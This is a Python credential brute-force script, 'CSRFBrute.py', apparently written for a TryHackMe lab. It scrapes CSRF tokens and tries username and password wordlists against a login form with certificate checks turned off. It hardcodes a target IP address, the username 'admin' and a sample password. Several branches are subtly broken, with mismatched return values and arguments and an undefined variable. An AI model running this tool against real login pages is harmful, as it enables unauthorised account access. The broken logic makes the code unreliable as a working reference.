import requests
import sys
import warnings
from bs4 import BeautifulSoup
import argparse
import urllib.parse
import re
import uuid

from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


def getToken(url, request):
    page = requests.get(url, verify=False)
    html_content = page.text
    soup = BeautifulSoup(html_content, features="lxml")
    try:
        title = soup.find("title").text
        gettk = soup.find("input", attrs={"type": 'hidden'})
        csrfname = gettk.get('name')
        token = soup.find('input', {"name": csrfname}).get("value")
        session_id = str(uuid.uuid1()).replace('-','')


    except AttributeError:
        print("[-] csrf token name/value error")
        sys.exit(1)

    return csrfname, token, title, session_id


def connect(username, password, url, csrfname, token, request, org_title, session_id):
    cookies = {
        "PHPSESSID": session_id
    }
    headers = {
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
        'Content-Type': 'application/x-www-form-urlencoded',
    }
    data = {
        'username': username,
        'password': password,
        csrfname: token,
    }
    login_request = requests.post(
        url, headers=headers, cookies=cookies, data=data, verify=False)
    # print(login_request.status_code)
    # print(org_title)
    # soup = BeautifulSoup(login_request.text, features="lxml")
    # logintitle = soup.find("title").text
    # print(logintitle)
    if org_title not in login_request.text:
        print("[+] Logged in sucessfully")
        return True
    else:
        print("[-] Wrong credentials")
        return False


def tryLogin(username, password, url, message, request):
    print("[+] Trying " + urllib.parse.quote(username) +
          ":" + urllib.parse.quote(password) + " combination")
    print("[+] Retrieving CSRF token to submit the login form")
    csrfname, token = getToken(url, request)

    print("[+] Login token is : {0}".format(token))

    found = connect(username, password, url, csrfname, token, message, request)

    if (not found):
        print("[-] Wrong credentials")
        return False
    else:
        print("[+] Logged in sucessfully")
        return True


def printSuccess(username, password):
    print("-------------------------------------------------------------")
    print()
    print("[*] Credentials:\t"+username+":"+password)
    print()


if __name__ == '__main__':
    url = 'https://54.251.17.75/core/dashboard/'
    username = 'admin'
    usernames = None  # '/home/tom14756/Desktop/TryHackMe/BastionHostingCreds/usernames.txt'
    password = None # 'Callcenteradmin@123'
    passwords = None  # '/home/tom14756/Desktop/TryHackMe/BastionHostingCreds/passwords.txt' 'data/wordlist/rockyou.txt'
    message = 'Invalid Username and/or Password'
    verbosity = None
    # parser = argparse.ArgumentParser()

    # # usernames can be one or more in a wordlist, but this two ptions are mutual exclusive
    # user_group = parser.add_mutually_exclusive_group(required=True)
    # user_group.add_argument('-l', '--username', help='username for bruteforce login')
    # user_group.add_argument('-L', '--usernames', help='usernames worldlist for bruteforce login')

    # # passwords can be one or more in a wordlist, but this two ptions are mutual exclusive
    # pass_group = parser.add_mutually_exclusive_group(required=True)
    # pass_group.add_argument('-p', '--password', help='password for bruteforce login')
    # pass_group.add_argument('-P', '--passwords', help='passwords wordlist for bruteforce login')

    # # url
    # parser.add_argument('-u', '--url', help='Url with login form', required=True)

    # # csrf
    # parser.add_argument('-c', '--csrfname', help='The csrf token input name on the login')

    # # error message
    # parser.add_argument('-m', '--message', help="The message of invalid cretials in the page after submit", required=True)

    # # verbosity
    # parser.add_argument('-v', '--verbosity', action='count', help='verbosity level')

    # args = parser.parse_args()

    print(
        '''
    ##########################################
    |	* CSRFBrute.py                       |
    |	* By D4ni3lTw                        |
    ##########################################
    '''
    )

    # one username and one password
    if (usernames == None and passwords == None):
        reqSess = requests.session()
        if (verbosity != None):
            found = tryLogin(username, password, url, message, reqSess)
            print()
        else:
            csrfname, token, title, session_id = getToken(url, reqSess)
            found = connect(username, password, url,
                            csrfname, token, reqSess, title, session_id)

        if (found):
            printSuccess(username, password)
            sys.exit(1)

    # one username and more passwords
    if (usernames == None and password == None):
        with open(passwords, 'rb') as passfile:
            for passwd in passfile.readlines():
                reqSess = requests.session()

                if (verbosity != None):
                    found = tryLogin(
                        username, passwd.decode().strip(), url, message, reqSess)
                    print()
                else:
                    csrfname, token, cookies_key, cookies_value, title = getToken(
                        url, reqSess)
                    found = connect(username, passwd.decode().strip(), url,
                                    csrfname, token, reqSess, cookies_key, cookies_value, title)

                if (found):
                    printSuccess(username, passwd.decode().strip())
                    sys.exit(1)

    # more usernames and one password
    if (username == None and passwords == None):
        with open(usernames, 'rb') as userfile:
            for user in userfile.readlines():
                reqSess = requests.session()

                if (verbosity != None):
                    found = tryLogin(user.decode().strip(),
                                     password, url, message, reqSess)
                    print()
                else:
                    csrfname, token, cookies_key, cookies_value, title = getToken(
                        url, reqSess)
                    found = connect(user.decode().strip(), password, url,
                                    csrfname, token, reqSess, cookies_key, cookies_value, title)

                if (found):
                    printSuccess(user.decode().strip(), passwd)
                    sys.exit(1)

    # more usernames and more passwords
    if (username == None and password == None):
        with open(usernames, 'rb') as userfile:
            with open(passwords, 'rb') as passfile:
                for user in userfile.readlines():
                    for passwd in passfile.readlines():
                        reqSess = requests.session()

                        if (verbosity != None):
                            found = tryLogin(user.decode().strip(
                            ), passwd.decode().strip(), url, message, reqSess)
                            print()
                        else:
                            csrfname, token, cookies_key, cookies_value, title = getToken(
                                url, reqSess)
                            found = connect(user.decode().strip(), passwd.decode().strip(), url,
                                            csrfname, token, reqSess, cookies_key, cookies_value, title)

                        if (found):
                            printSuccess(user.decode().strip(),
                                         passwd.decode().strip())
                            sys.exit(1)
